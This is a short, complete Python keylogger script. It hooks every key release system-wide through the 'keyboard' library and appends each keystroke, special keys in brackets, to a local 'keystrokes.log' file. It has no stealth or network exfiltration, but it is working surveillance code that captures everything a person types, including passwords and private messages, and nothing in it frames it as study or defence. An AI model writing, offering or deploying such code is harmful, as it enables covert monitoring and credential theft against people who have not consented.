import keyboard

# Function to log pressed keys
def log_keystroke(event):
    key = event.name
    if len(key) == 1:
        # Normal key press
        with open("keystrokes.log", "a") as log_file:
            log_file.write(key)
    else:
        # Special keys (e.g., Enter, Shift, etc.)
        with open("keystrokes.log", "a") as log_file:
            log_file.write(f"[{key}]")

# Setup hook to capture key events
keyboard.on_release(log_keystroke)

# Keep the script running
keyboard.wait()
